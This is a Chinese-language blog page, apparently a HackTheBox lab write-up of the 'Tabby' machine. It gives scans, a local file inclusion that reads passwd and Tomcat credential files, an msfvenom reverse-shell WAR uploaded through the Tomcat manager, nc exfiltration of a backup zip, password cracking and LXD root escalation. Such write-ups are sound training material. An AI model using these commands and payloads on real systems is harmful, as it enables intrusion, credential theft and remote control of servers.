@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Hackthebox-Tabby - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="前言 之前一段时间一直在做 Vulnhub，但是感觉自己的能力提升比较有限，于是打算换换口味做做好评如潮的 Hackthebox，毕竟注册都能给人" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/2020-10-11-hackthebox-tabby/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Hackthebox-Tabby" />
+<meta property="og:description" content="前言 之前一段时间一直在做 Vulnhub，但是感觉自己的能力提升比较有限，于是打算换换口味做做好评如潮的 Hackthebox，毕竟注册都能给人" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/2020-10-11-hackthebox-tabby/" />
+<meta property="article:published_time" content="2020-10-11T13:58:50+00:00" />
+<meta property="article:modified_time" content="2020-10-11T13:58:50+00:00" />
+<meta itemprop="name" content="Hackthebox-Tabby">
+<meta itemprop="description" content="前言 之前一段时间一直在做 Vulnhub，但是感觉自己的能力提升比较有限，于是打算换换口味做做好评如潮的 Hackthebox，毕竟注册都能给人">
+<meta itemprop="datePublished" content="2020-10-11T13:58:50+00:00" />
+<meta itemprop="dateModified" content="2020-10-11T13:58:50+00:00" />
+<meta itemprop="wordCount" content="1770">
+
+
+
+<meta itemprop="keywords" content="Hackthebox," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hackthebox-Tabby"/>
+<meta name="twitter:description" content="前言 之前一段时间一直在做 Vulnhub，但是感觉自己的能力提升比较有限，于是打算换换口味做做好评如潮的 Hackthebox，毕竟注册都能给人"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Even</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Even</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Hackthebox-Tabby</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-10-11 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#前言">前言</a></li>
+        <li><a href="#基本介绍">基本介绍</a>
+          <ul>
+            <li><a href="#靶机介绍">靶机介绍</a></li>
+            <li><a href="#工具列表">工具列表</a></li>
+          </ul>
+        </li>
+        <li><a href="#user-flag-部分">User flag 部分</a>
+          <ul>
+            <li><a href="#端口扫描及服务发现">端口扫描及服务发现</a></li>
+            <li><a href="#web-探测">Web 探测</a></li>
+            <li><a href="#tomcat">Tomcat</a></li>
+            <li><a href="#横向越权">横向越权</a></li>
+          </ul>
+        </li>
+        <li><a href="#system-flag-部分">System flag 部分</a></li>
+        <li><a href="#参考链接">参考链接</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="前言">前言</h2>
+<p>之前一段时间一直在做 <strong>Vulnhub</strong>，但是感觉自己的能力提升比较有限，于是打算换换口味做做好评如潮的 <strong>Hackthebox</strong>，毕竟注册都能给人惊喜，还有垂涎已久的 <strong>windows</strong> 靶机，其次不用花半天时间去下载 <strong>vm</strong> 再导入虚拟机。于是有了这篇试水之作。</p>
+<p><strong>htb</strong> 毕竟是一个平台，看了一下有着固定的套路 (如有错误还请指出)，渗透的目标是获取 <strong>user flag</strong> 和 <strong>system flag</strong> (拿来计算分数，产生排名)。而 <strong>htb</strong> 的特点是与真实环境的相似性 (更加痛苦与快乐)，相比 <strong>Vulnhub</strong> 感觉更有挑战性。</p>
+<p>暂时对 <strong>htb</strong> 的理解有限，但接入是靠 <strong>openvpn</strong> 的，不得不说这个网络问题，嗯，很坑，后续会更新我网络环境搭建的心得。</p>
+<h2 id="基本介绍">基本介绍</h2>
+<h3 id="靶机介绍">靶机介绍</h3>
+<p><img src="/images/2020-10-11/intro.webp" alt="intro"></p>
+<p>基本信息都在这张图上，绿色圈圈代表难度为 <strong>easy</strong>，操作系统为 <strong>Linux</strong>。</p>
+<h3 id="工具列表">工具列表</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Nmap</td>
+<td style="text-align:left">7.80</td>
+</tr>
+<tr>
+<td style="text-align:left">curl</td>
+<td style="text-align:left">7.72.0</td>
+</tr>
+<tr>
+<td style="text-align:left">metasploit</td>
+<td style="text-align:left">5.0.101</td>
+</tr>
+</tbody>
+</table>
+<h2 id="user-flag-部分">User flag 部分</h2>
+<h3 id="端口扫描及服务发现">端口扫描及服务发现</h3>
+<p><strong>htb</strong> 在 <strong>Join Machine</strong> 后即会提供靶机的 <strong>IP</strong> 地址，从而不用做 <strong>IP</strong> 发现之类的工作，直接从扫端口和服务发现开始，此处分配到的 <strong>IP</strong> 为 <em><strong>10.10.10.194</strong></em>。由于是远程的靶机，全端口扫描真的很慢，对于这个靶机快速扫描的结果已经完全够用了 (之后进行过全端口扫描然后比对)。</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sS -F 10.10.10.194
+</code></pre></td></tr></table>
+</div>
+</div><p>Not shown: 97 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+{% endblockquote %}</p>
+<p>开放了三个端口，枚举服务：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sC -sV -p22,80,8080 -O 10.10.10.194
+</code></pre></td></tr></table>
+</div>
+</div><p>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endblockquote %}</p>
+<h3 id="web-探测">Web 探测</h3>
+<p>首先使用浏览器查看:</p>
+<p><img src="/images/2020-10-11/index.webp" alt="index"></p>
+<p>果然很贴近正常的业务，点击到 <strong>NEWS</strong> 出现 404 页面，url 为：</p>
+<p><a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a></p>
+<p>把 <strong>megahosting.htb</strong> 换成靶机的 <strong>IP</strong> 地址得到以下页面：</p>
+<p><img src="/images/2020-10-11/news.webp" alt="news"></p>
+<p>看 <strong>url</strong> 似乎是本地文件包含，使用以下的 url 进行验证:</p>
+<p><a href="http://10.10.10.194/news.php?file=../../../../etc/passwd">http://10.10.10.194/news.php?file=../../../../etc/passwd</a></p>
+<p><img src="/images/2020-10-11/lfi.webp" alt="lfi"></p>
+<p>当然这么手动输入没毛病，使用 <strong>wfuzz</strong> 明显效率更高。</p>
+<h3 id="tomcat">Tomcat</h3>
+<p>首先查看网页:</p>
+<p><img src="/images/2020-10-11/tomcat.webp" alt="tomcat"></p>
+<p>默认页面，由于存在 LFI 漏洞，直接读取 <strong>tomcat-users.xml</strong> 获取账户名和密码，这里我使用了 <strong>curl</strong> :</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">curl <span class="s1">&#39;http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="c">&lt;!--
+</span><span class="c">  Licensed to the Apache Software Foundation (ASF) under one or more
+</span><span class="c">  contributor license agreements.  See the NOTICE file distributed with
+</span><span class="c">  this work for additional information regarding copyright ownership.
+</span><span class="c">  The ASF licenses this file to You under the Apache License, Version 2.0
+</span><span class="c">  (the &#34;License&#34;); you may not use this file except in compliance with
+</span><span class="c">  the License.  You may obtain a copy of the License at
+</span><span class="c">
+</span><span class="c">      http://www.apache.org/licenses/LICENSE-2.0
+</span><span class="c">
+</span><span class="c">  Unless required by applicable law or agreed to in writing, software
+</span><span class="c">  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
+</span><span class="c">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span class="c">  See the License for the specific language governing permissions and
+</span><span class="c">  limitations under the License.
+</span><span class="c">--&gt;</span>
+<span class="nt">&lt;tomcat-users</span> <span class="na">xmlns=</span><span class="s">&#34;http://tomcat.apache.org/xml&#34;</span>
+              <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+              <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
+              <span class="na">version=</span><span class="s">&#34;1.0&#34;</span><span class="nt">&gt;</span>
+<span class="c">&lt;!--
+</span><span class="c">  NOTE:  By default, no user is included in the &#34;manager-gui&#34; role required
+</span><span class="c">  to operate the &#34;/manager/html&#34; web application.  If you wish to use this app,
+</span><span class="c">  you must define such a user - the username and password are arbitrary. It is
+</span><span class="c">  strongly recommended that you do NOT use one of the users in the commented out
+</span><span class="c">  section below since they are intended for use with the examples web
+</span><span class="c">  application.
+</span><span class="c">--&gt;</span>
+<span class="c">&lt;!--
+</span><span class="c">  NOTE:  The sample user and role entries below are intended for use with the
+</span><span class="c">  examples web application. They are wrapped in a comment and thus are ignored
+</span><span class="c">  when reading this file. If you wish to configure these users for use with the
+</span><span class="c">  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
+</span><span class="c">  them. You will also need to set the passwords to something appropriate.
+</span><span class="c">--&gt;</span>
+<span class="c">&lt;!--
+</span><span class="c">  &lt;role rolename=&#34;tomcat&#34;/&gt;
+</span><span class="c">  &lt;role rolename=&#34;role1&#34;/&gt;
+</span><span class="c">  &lt;user username=&#34;tomcat&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat&#34;/&gt;
+</span><span class="c">  &lt;user username=&#34;both&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;tomcat,role1&#34;/&gt;
+</span><span class="c">  &lt;user username=&#34;role1&#34; password=&#34;&lt;must-be-changed&gt;&#34; roles=&#34;role1&#34;/&gt;
+</span><span class="c">--&gt;</span>
+   <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;admin-gui&#34;</span><span class="nt">/&gt;</span>
+   <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">&#34;manager-script&#34;</span><span class="nt">/&gt;</span>
+   <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">&#34;tomcat&#34;</span> <span class="na">password=</span><span class="s">&#34;$3cureP4s5w0rd123!&#34;</span> <span class="na">roles=</span><span class="s">&#34;admin-gui,manager-script&#34;</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/tomcat-users&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>{% endblockquote %}</p>
+<p>由于对于 <strong>tomcat</strong> 实在是陌生，那几个管理页面也是够绕的，结合请教小伙伴加 google 后，由于账户的 <strong>role</strong> 为 <strong>manager-script</strong>，发现可以利用 <strong>/manager/text</strong> 接口上传恶意 <strong>war</strong> 包来 <strong>getshell</strong>：</p>
+<p>首先使用 msfvenom 生成 payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p java/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; -f war &gt; shell.war
+</code></pre></td></tr></table>
+</div>
+</div><p>这里的 <strong>&lt;IP&gt;</strong> 为本机 <strong>openvpn</strong> 对应的接口的 <strong>IP</strong> 地址，此处也使用 <strong>curl</strong> 来上传 war 包:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">curl -u tomcat:<span class="s1">&#39;$3cureP4s5w0rd123!&#39;</span> -T shell.war <span class="s1">&#39;http://10.10.10.194:8080/manager/text/deploy?path=/haha&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>上传成功会返回: <strong>OK - Deploy application at context path [/haha]</strong></p>
+<p>接着访问 <strong>http://10.10.10.194:8080/haha</strong> 来触发 reverse shell，访问之前需要监听对应的端口，使用 <strong>nc</strong> 即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp &lt;PORT&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>使用 <strong>curl</strong> 触发：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">curl http://10.10.10.194:8080/haha
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-10-11/rev_shell.webp" alt="rev_shell"></p>
+<p>接着发现该机器上有 python3 的环境，使用以下命令得到一个虚拟的 <strong>tty</strong> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python3 -c <span class="s2">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-10-11/py_tty.webp" alt="py_rev"></p>
+<h3 id="横向越权">横向越权</h3>
+<p>之前已经得到 <strong>/etc/passwd</strong> 的内容，了解到存在用户 <strong>ash</strong>，接着横向越权比较头疼，这部分了解不足。<strong>ash</strong> 的 <strong>home</strong> 权限配置没有问题，也没有与 <strong>ash</strong> 有关的可以修改的脚本之类的，至于 <strong>SUID</strong> 这块更是没有，系统也是最新的 Ubuntu。参考了他人的 walkthrough 才发现还有以下的操作？</p>
+<p><strong>/var/www/html</strong> 目录下的 <strong>files</strong> 目录下有一个 zip 压缩包，使用 <strong>nc</strong> 将其下载下来。</p>
+<p>本机:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">3333</span> &gt; backup.zip
+</code></pre></td></tr></table>
+</div>
+</div><p>靶机:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -w <span class="m">1</span> &lt;IP&gt; <span class="m">3333</span> &lt; 16162020_backup.zip
+</code></pre></td></tr></table>
+</div>
+</div><p>这里 <strong>-w 1</strong> 参数可在传输结束后 4 秒自动关闭 <strong>nc</strong>，毕竟这里使用 <strong>ctrl-c</strong> 会有惊喜。</p>
+<p>尝试解压发现有密码，使用 <strong>fcrackzip</strong> 进行破解：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">fcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-10-11/zip_crack.webp" alt="zip_crack"></p>
+<p>最没有想到的，这就是 <strong>ash</strong> 账户的密码，直接 <strong>su</strong> 即可:</p>
+<p><img src="/images/2020-10-11/ash.webp" alt="ash"></p>
+<p>至此已经可以拿到 <strong>user-flag</strong>。</p>
+<h2 id="system-flag-部分">System flag 部分</h2>
+<p><strong>ash</strong> 的目录下有 <strong>snap</strong> 目录，而且用户的属组有 <strong>lxd</strong>，发现本机存在 <strong>lxc / lxd</strong>，想到这个与 <strong>docker</strong> 很相似，LPE 应该不是难事。</p>
+<p>这里我参考了 <strong>hackingarticles</strong> 上的教程，与 <strong>docker</strong> 提权类似，也是将根目录挂载到了容器里，这里我挂载到了容器内的 <strong>/mnt/root</strong> 下，最终获得 <strong>root</strong> 权限:</p>
+<p><img src="/images/2020-10-11/root.webp" alt="root"></p>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li>
+<p><a href="https://www.geeksforgeeks.org/local-file-inclusion-lfi/">LFI</a></p>
+</li>
+<li>
+<p><a href="https://mp.weixin.qq.com/s/ZXoCJ9GhMaTvVFeYn8vMUA">Tomcat 渗透总结</a></p>
+</li>
+<li>
+<p><a href="https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00">Exploiting Apache Tomcat manager-script role</a></p>
+</li>
+<li>
+<p><a href="https://www.geeksforgeeks.org/tabby-hack-the-box-walkthrough-for-user-flag/">Tabby Walkthrough</a></p>
+</li>
+<li>
+<p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd Privilege Escalation</a></p>
+</li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2020-10-11
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/hackthebox/">Hackthebox</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2020-10-29-hackthebox-doctor/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Hackthebox-Doctor</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/2020-09-21-vulnhub-pwned-1/">
+            <span class="next-text nav-default">Vulnhub-Pwned: 1</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
